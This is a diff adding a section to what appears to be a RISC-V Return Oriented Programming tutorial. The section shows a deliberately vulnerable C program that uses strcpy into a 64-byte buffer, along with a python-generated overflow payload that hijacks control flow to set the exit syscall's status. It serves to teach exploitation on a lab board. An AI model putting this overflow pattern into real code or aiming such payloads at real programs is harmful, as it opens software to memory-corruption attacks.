@@ -411,6 +411,50 @@ Using Return Oriented Programming is it possible hence to manipulate registers. 
 
 In yellow It is highlighted the difference between a direct jump to `not_called` or a jump that goes first in the `test_empty2` function.
 
+## Manipulating exit syscall status using arbitrary stack values
+We can exploit this different type of program, knowing that the a6 register will be overflow after the **56th** character put in the buffer. Once had the overflow to the not_called function, we return directly to the point the a6 value is overwritten and here we find our arbitrary filled buffer (and then arbitrary crafted stack) that will be copied in the a0 register and will be used as argument of the **exit** function. The ecall runs the system call.
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+void not_called() {
+    printf("exit function\n");
+    asm volatile ("li a6, 0");
+    asm volatile ("mv a0, a6");
+    asm volatile ("li a7, 93");
+    asm volatile ("ecall");
+    return;
+}
+
+int test_empty() {
+    printf("Empty function\n");
+    return 1;
+}
+
+void vulnerable_function(char* string) {
+    char buffer[64];
+    test_empty();
+    strcpy(buffer, string);
+}
+
+int main(int argc, char** argv) {
+    vulnerable_function(argv[1]);
+    return 0;
+}
+```
+
+Here, after the 56th character (then after buffer is filled) the a6 register is overwritten with the arbitrary **HEX** value put in the exploit. If the **not_called** function is executed normally It would result in a exit code 0. The following code will give an exit value of 1
+
+```bash
+./rop.out "$(python3 -c 'print("A"*56 + "\x01" + "B"*15 + "\x5a\x05\x01\x00")')"
+```
+
+Give that, replacin this character will give us an arbitrary value of the exit function and this means that **we can control the exit system call return value**.
+
+<img src='img/exit_manipulation_stack.png' width='700'>
+
 ---
 
 ## Testing the MILK-V Duo S board
